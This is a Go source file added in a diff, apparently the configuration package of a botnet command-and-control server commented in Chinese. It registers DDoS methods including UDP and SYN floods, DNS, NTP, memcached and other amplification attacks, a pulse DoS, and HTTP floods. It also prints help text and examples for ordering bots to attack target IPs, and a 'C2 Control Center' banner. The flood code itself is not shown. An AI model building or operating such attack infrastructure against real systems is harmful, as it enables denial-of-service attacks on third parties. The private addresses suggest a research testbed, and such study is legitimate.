@@ -1,0 +1,222 @@
+package config
+
+import (
+	"fmt"
+	"sync"
+)
+
+// 全局配置
+const (
+	// ServerPort C2服务器监听端口
+	ServerPort = ":80"
+	// HistoryFile 命令历史文件
+	HistoryFile = ".c2_history"
+	// LogFile 机器人连接日志文件
+	LogFile = "bots.log"
+	// Version C2服务器版本
+	Version = "v2.2"
+	// ConfigDir HTTP攻击配置文件目录
+	ConfigDir = "config"
+	ShowCommandPreviewLength = 1000
+)
+
+type BotCommand struct {
+    Method  string      `json:"method"`
+    IP      string      `json:"ip"`
+    Port    int     	`json:"port"`
+    Path    string      `json:"path"`
+    Header  string 		`json:"header"`
+    Payload string		`json:"payload"`
+}
+
+// 攻击方法分类
+var (
+	// Layer4Methods 网络层攻击方法
+	Layer4Methods = map[string]bool{
+		"UDP":          true,
+		"SYN":          true,
+		"DNS":          true,
+		"NTP":          true,
+		"CLDAP":        true,
+		"RDP":          true,
+		"SSDP":         true,
+		"SNMP":         true,
+		"CHARGEN":      true,
+		"OPENVPN":      true,
+		"MEMCACHED":    true,
+		"DNSBOMB":      true,
+		"DNSBOOMERANG": true,
+	}
+
+	// HTTPMethods HTTP攻击方法
+	HTTPMethods = map[string]bool{
+		"GET":  true,
+		"POST": true,
+		"CURL": true,
+		"SLOWLORIS": true,
+	}
+
+	// RegisteredMethods 所有注册的攻击方法
+	RegisteredMethods = []string{}
+
+	// 互斥锁保护配置
+	configMu sync.RWMutex
+)
+
+// 攻击方法分类描述
+var (
+	// Layer4Description 网络层攻击方法描述
+	Layer4Description = map[string]string{
+		"UDP":          "UDP flood attack",
+		"SYN":          "TCP SYN flood",
+		"DNS":          "DNS amplification attack",
+		"NTP":          "NTP amplification attack",
+		"CLDAP":        "CLDAP amplification attack",
+		"RDP":          "RDP amplification attack",
+		"SSDP":         "SSDP amplification attack",
+		"SNMP":         "SNMP amplification attack",
+		"CHARGEN":      "CHARGEN amplification attack",
+		"OPENVPN":      "OPENVPN amplification attack",
+		"MEMCACHED":    "MEMCACHED amplification attack",
+		"DNSBOMB":      "Pulse DoS attack from 2024 IEEE S&P paper",
+		"DNSBOOMERANG": "Pulse DNS attack",
+	}
+
+	// HTTPDescription HTTP攻击方法描述
+	HTTPDescription = map[string]string{
+		"GET":  "HTTP GET request, requires attack path, can load headers from folder",
+		"POST": "HTTP POST flood attack, requires attack path, can load headers/payload from folder",
+	}
+)
+
+// Init 初始化配置
+func Init() {
+	configMu.Lock()
+	defer configMu.Unlock()
+	
+	// 注册所有攻击方法
+	RegisteredMethods = make([]string, 0, len(Layer4Methods)+len(HTTPMethods))
+	
+	// 注册Layer4方法
+	for method := range Layer4Methods {
+		RegisteredMethods = append(RegisteredMethods, method)
+	}
+	
+	// 注册HTTP方法
+	for method := range HTTPMethods {
+		RegisteredMethods = append(RegisteredMethods, method)
+	}
+}
+
+// IsValidMethod 检查攻击方法是否有效
+func IsValidMethod(method string) bool {
+	configMu.RLock()
+	defer configMu.RUnlock()
+	
+	if Layer4Methods[method] || HTTPMethods[method] {
+		return true
+	}
+	return false
+}
+
+// IsHTTPMethod 检查是否是HTTP攻击方法
+func IsHTTPMethod(method string) bool {
+	configMu.RLock()
+	defer configMu.RUnlock()
+	
+	return HTTPMethods[method]
+}
+
+// IsLayer4Method 检查是否是Layer4攻击方法
+func IsLayer4Method(method string) bool {
+	configMu.RLock()
+	defer configMu.RUnlock()
+	
+	return Layer4Methods[method]
+}
+
+// GetMethodDescription 获取攻击方法描述
+func GetMethodDescription(method string) string {
+	configMu.RLock()
+	defer configMu.RUnlock()
+	
+	if desc, ok := Layer4Description[method]; ok {
+		return desc
+	}
+	
+	if desc, ok := HTTPDescription[method]; ok {
+		return desc
+	}
+	
+	return "Unknown attack method"
+}
+
+// GetAllMethods 获取所有注册的攻击方法
+func GetAllMethods() []string {
+	configMu.RLock()
+	defer configMu.RUnlock()
+	
+	return append([]string{}, RegisteredMethods...)
+}
+
+// GetCommandHelp 获取命令帮助信息
+func GetCommandHelp() string {
+	return `
+Available Commands:
+  attack <method> <target IP> <port> [path] [configName/botIP]                       - Launch attack
+  list                                                                               - List all bots
+  info <bot IP>                                                                      - Show bot details
+  clear                                                                              - Clear screen
+  help                                                                               - Show help
+  stop                                                                               - Stop specified/all bots
+  exit                                                                               - Exit program
+
+Attack Methods:
+  UDP           - UDP flood attack
+  SYN           - TCP SYN flood
+  DNS           - DNS amplification attack
+  NTP           - NTP attack
+  CLDAP         - CLDAP attack
+  RDP           - RDP attack
+  SSDP          - SSDP attack
+  SNMP          - SNMP attack
+  CHARGEN       - CHARGEN attack
+  OPENVPN       - OPENVPN attack
+  MEMCACHED     - MEMCACHED attack
+  DNSBOMB       - Pulse DoS attack from 2024 IEEE S&P paper
+  DNSBOOMERANG  - Pulse DNS attack
+  GET           - HTTP GET request, requires attack path, can load headers from config folder
+  POST          - HTTP POST flood attack, requires attack path, can load headers/payload from config folder
+
+GET Attack:
+  download: target 10.180.0.71:80/download/test.txt, directory from config/get/ 
+  get_html: target 10.180.0.71:80/, directory from config/get/
+  CURL_download: target 10.180.0.71:80/, directory from config/curl/
+
+POST Attack:
+  deepseek: target 10.153.0.71:11434/api/chat, payload from config/deepseek/
+
+You can deploy any services you are interested in on the victim and configure the related HTTP methods.
+
+Examples:
+  attack UDP 192.168.1.100 80                 - Layer 4 attack
+  attack UDP 192.168.1.100 80 10.0.0.1        - Layer 4 attack from specific bot
+  attack GET 10.100.0.150 80 /history.html    - HTTP GET attack
+  attack POST 10.153.0.71 11434 /api/chat deepseek - Load from config/deepseek/
+  attack POST 10.100.0.150 80 /login.php 10.0.0.1  - POST attack from specific bot
+  stop 10.0.0.1                               - Stop specified bot
+  stop                                        - Stop all bots`
+}
+
+// GetBanner 获取程序横幅
+func GetBanner() string {
+	return fmt.Sprintf(`
+  ____ ____   ___   ___   ___  
+ / ___|___ \ / _ \ / _ \ / _ \ 
+| |     __) | | | | | | | | | |
+| |___ / __/| |_| | |_| | |_| |
+ \____|_____|\___/ \___/ \___/  %s
+
+C2 Control Center Initialized
+Type 'help' to see available commands`, Version)
+}
